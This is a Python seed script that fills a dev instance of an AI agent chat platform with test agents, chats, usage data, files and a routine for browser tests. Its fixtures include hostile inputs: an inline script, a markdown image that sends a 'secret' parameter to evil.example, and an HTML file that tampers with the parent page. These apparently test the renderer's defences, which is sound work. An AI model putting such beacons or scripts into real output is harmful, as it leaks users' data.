"""Seeds a disposable stack (docker container cubebot-dev-pg) for platform_browser.mjs."""
# ruff: noqa: E501

import http.cookiejar
import io
import json
import math
import random
import struct
import subprocess
import sys
import urllib.request
import uuid
import wave
import zlib

B = "http://127.0.0.1:3100"
cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))


def call(method, path, body=None, raw=None, ctype=None):
    h = {"origin": B, "cubebot-csrf": "1"}
    data = None
    if body is not None:
        data = json.dumps(body).encode()
        h["content-type"] = "application/json"
    if raw is not None:
        data = raw
        h["content-type"] = ctype or "application/octet-stream"
    r = urllib.request.Request(B + path, data=data, method=method, headers=h)
    try:
        with op.open(r) as x:
            t = x.read()
            return x.status, (json.loads(t) if t[:1] in b"{[" else t)
    except urllib.error.HTTPError as e:
        return e.code, e.read()


def sql(q):
    return subprocess.run(
        [
            "docker",
            "exec",
            "-i",
            "cubebot-dev-pg",
            "psql",
            "-U",
            "cubebot",
            "-v",
            "ON_ERROR_STOP=1",
            "-q",
            "-t",
            "-A",
        ],
        input=q,
        text=True,
        capture_output=True,
        check=True,
    ).stdout.strip()


print(
    call(
        "POST",
        "/api/identity/login",
        {"login": "victor", "password": "dev-password-123"},
    )[0]
)
for c in cj:
    print(c.name)
ids = {}
for name, paint, acc in [
    ("Ayla", "sky", "bow"),
    ("Test Agent", "orange", "none"),
    ("Kind guy", "sage", "antenna"),
    ("testy", "plum", "glasses"),
]:
    s, a = call(
        "POST",
        "/api/agents",
        {
            "request_id": str(uuid.uuid4()),
            "name": name,
            "instructions": "Be useful.",
            "avatar": {"paint": paint, "eyes": "round", "accessory": acc},
        },
    )
    assert s < 300, (s, a)
    ids[name] = a["id"]
me = sql("select id from human_accounts where login='victor'")
RESP = r"""I found these five most recent items in the order history:

1. **Apr 12, 2025** — *Essential Software Design Patterns for JavaScript Developers*
2. **Sep 13, 2022** — Amazon Kitchen Sandwich, 11.3 oz
3. ~~Sep 12~~ **Sep 13, 2022** — `Alki Club` Sandwich

## Totals

| Item | Qty | Price |
| :--- | --: | ---: |
| Book | 1 | $24.99 |
| Sandwich | 2 | $11.50 |

- [x] Checked the order page
- [ ] Verified the receipts

> The four items from Sep 13 were part of one Amazon Go order.

```python
def total(items):
    return sum(item.price for item in items)
```

```mermaid
graph LR; Order-->Items; Items-->Total
```

Energy is $$E = mc^2$$ and see [the docs](https://example.com/docs). <script>alert('no')</script>

![tracker](https://evil.example/x.png?secret=1)
"""


def turn(
    agent,
    msg,
    status="complete",
    resp=None,
    err=None,
    ago="1 hour",
    provider="openai",
    model="gpt-5.5",
    inp=4000,
    out=800,
    cost=0.05,
    days=0,
):
    r = resp.replace("'", "''") if resp else None
    q = f"""INSERT INTO chat_turns (conversation_id,actor_id,request_id,message,status,response,error,completed_at,created_at,provider,model)
    VALUES ('{agent}','{me}',gen_random_uuid(),'{msg}','{status}',{"'" + r + "'" if r else "NULL"},{"'" + err + "'" if err else "NULL"},{"clock_timestamp()-interval '" + ago + "'" if status == "complete" else "NULL"},clock_timestamp()-interval '{ago}','{provider}','{model}') RETURNING id;"""
    return sql(q).split("\n")[0]


a = ids["Ayla"]
k = ids["Kind guy"]
t = ids["Test Agent"]
y = ids["testy"]
first = turn(a, "**List** my last five orders, please.", resp=RESP, ago="2 hours")
turn(
    a,
    "Thanks, and a chart?",
    resp="Here it is, with a voice note and the raw data.",
    ago="1 hour",
)
turn(k, "Summarize the launch", status="running", ago="3 minutes")
turn(t, "Check the disk", status="waiting", err="provider_unavailable", ago="8 minutes")
turn(y, "Rotate the logs", status="failed", err="provider_rejected", ago="20 minutes")
turn(a, "Queued follow-up", status="queued", ago="1 minute")
# usage history over 30 days
vals = []
random.seed(4)
for ag, scale in [(a, 1.0), (k, 0.5), (t, 0.25), (y, 0.1)]:
    for d in range(0, 28):
        if random.random() < 0.75:
            i = int(random.random() * scale * 180000 + 2000)
            o = int(i * 0.12)
            cost = i * 5e-6 + o * 15e-6
            vals.append(
                f"('{ag}','turn','openai','gpt-5.5',{i},{i // 4},{o},{cost},clock_timestamp()-interval '{d} days')"
            )
vals.append(
    "(NULL,'coordinator','openai','gpt-4.1-mini',3000,0,300,0.002,clock_timestamp()-interval '1 day')"
)
vals.append(
    f"('{a}','turn','anthropic','claude-mystery',9000,0,300,NULL,clock_timestamp()-interval '1 hour')"
)
sql(
    "INSERT INTO usage_events (agent_id,kind,provider,model,input_tokens,cached_input_tokens,output_tokens,cost_usd,created_at) VALUES "
    + ",".join(vals)
    + ";"
)
sql(
    f"UPDATE agents SET monthly_budget_usd=20 WHERE id='{k}'; UPDATE agents SET monthly_budget_usd=3 WHERE id='{y}'; UPDATE agents SET monthly_budget_usd=4 WHERE id='{t}';"
)
# room
s, room = call(
    "POST",
    "/api/rooms",
    {"request_id": str(uuid.uuid4()), "name": "Test room", "agents": [a, k]},
)
assert s < 300, room
s, m = call(
    "POST",
    f"/api/rooms/{room['id']}/messages",
    {
        "request_id": str(uuid.uuid4()),
        "message": "@Ayla what have we **accomplished** on the last 2 days?",
    },
)
assert s < 300, m
dt = m["deliveries"][0]["turn"]
sql(
    f"""UPDATE chat_turns SET status='complete', completed_at=clock_timestamp(), response='Based on the recent room history, we:\n\n- Shared book recommendations similar to *The Hobbit*.\n- Created a **coding playbook**.' WHERE id='{dt}';""".replace(
        "\\n", "'||E'\\n'||'"
    )
)


# files
def png(w=320, h=200):
    raw = b"".join(
        b"\0" + b"".join(bytes([x * 255 // w, 120, y * 255 // h]) for x in range(w))
        for y in range(h)
    )

    def ch(t, d):
        return struct.pack(">I", len(d)) + t + d + struct.pack(">I", zlib.crc32(t + d))

    return (
        b"\x89PNG\r\n\x1a\n"
        + ch(b"IHDR", struct.pack(">IIBBBBB", w, h, 8, 2, 0, 0, 0))
        + ch(b"IDAT", zlib.compress(raw))
        + ch(b"IEND", b"")
    )


def wav():
    b = io.BytesIO()
    w = wave.open(b, "wb")
    w.setnchannels(1)
    w.setsampwidth(2)
    w.setframerate(8000)
    w.writeframes(
        b"".join(struct.pack("<h", int(9000 * math.sin(i / 6))) for i in range(16000))
    )
    w.close()
    return b.getvalue()


PDF = b"""%PDF-1.4
1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj
2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj
3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 400 300]/Contents 4 0 R/Resources<</Font<</F1 5 0 R>>>>>>endobj
4 0 obj<</Length 44>>stream
BT /F1 24 Tf 50 150 Td (Cubebot report) Tj ET
endstream endobj
5 0 obj<</Type/Font/Subtype/Type1/BaseFont/Helvetica>>endobj
trailer<</Root 1 0 R>>
"""
files = {
    "a_small_map_of_home.txt": (
        b"A small map of home.\nThe kettle is left of the window.\n",
        "text/plain",
    ),
    "notes.md": (
        b"# Notes\n\nSome **bold** text and a list:\n\n- one\n- two\n",
        "text/markdown",
    ),
    "orders.csv": (
        b'item,qty,price\n"Book, large",1,24.99\nSandwich,2,11.50\n',
        "text/csv",
    ),
    "config.json": (b'{"a":1,"b":[1,2,3]}', "application/json"),
    "chart.png": (png(), "image/png"),
    "voice.wav": (wav(), "audio/wav"),
    "report.pdf": (PDF, "application/pdf"),
    "page.html": (
        b'<h1 id=x>Page</h1><script>document.getElementById("x").textContent="SCRIPT RAN";window.parent.document.title="PWNED"</script>',
        "text/html",
    ),
    "archive.zip": (b"PK\x05\x06" + b"\0" * 18, "application/zip"),
}
got = {}
for n, (d, c) in files.items():
    s, e = call(
        "POST", f"/api/files?name={n}&request_id={uuid.uuid4()}", raw=d, ctype=c
    )
    assert s < 300, (n, s, e)
    got[n] = e["id"]
# attachments as the agent's own files
last = sql(
    f"select id from chat_turns where conversation_id='{a}' and message like 'Thanks%'"
)
for n in ["chart.png", "voice.wav", "orders.csv"]:
    s, e = call(
        "POST",
        f"/api/files?name=sent-1f3a9c2e-{n}&request_id={uuid.uuid4()}",
        raw=files[n][0],
        ctype=None,
    )
    fid = e["id"]
    sql(
        f"UPDATE files SET owner_account_id=NULL,owner_agent_id='{a}',name='{n.split('.')[0]}-1f3a9c2e.{n.split('.')[1]}' WHERE id='{fid}'; INSERT INTO turn_attachments(turn_id,file_id) VALUES ('{last}','{fid}');"
    )
s, e = call(
    "POST",
    f"/api/files?name=roomfile.png&request_id={uuid.uuid4()}",
    raw=files["chart.png"][0],
)
sql(
    f"UPDATE files SET owner_account_id=NULL,owner_agent_id='{a}' WHERE id='{e['id']}'; INSERT INTO turn_attachments(turn_id,file_id) VALUES ('{dt}','{e['id']}');"
)
# routines
s, r = call(
    "POST",
    f"/api/agents/{a}/routines",
    {
        "request_id": str(uuid.uuid4()),
        "webhook": True,
        "routine": {
            "name": "Deploy alert",
            "prompt": "Read the alert and summarize it.",
            "command": None,
            "schedule": None,
            "coalesce": False,
            "enabled": True,
        },
    },
)
assert s < 300, r
print(
    json.dumps(
        {
            "room": room["id"],
            "routine": r["routine"]["id"],
            "secret": r["secret"],
            "ayla": a,
            "files": got,
            "first": first,
        }
    )
)
json.dump(
    {
        "room": room["id"],
        "routine": r["routine"]["id"],
        "secret": r["secret"],
        "ayla": a,
        "files": got,
    },
    open(sys.argv[1], "w"),
)
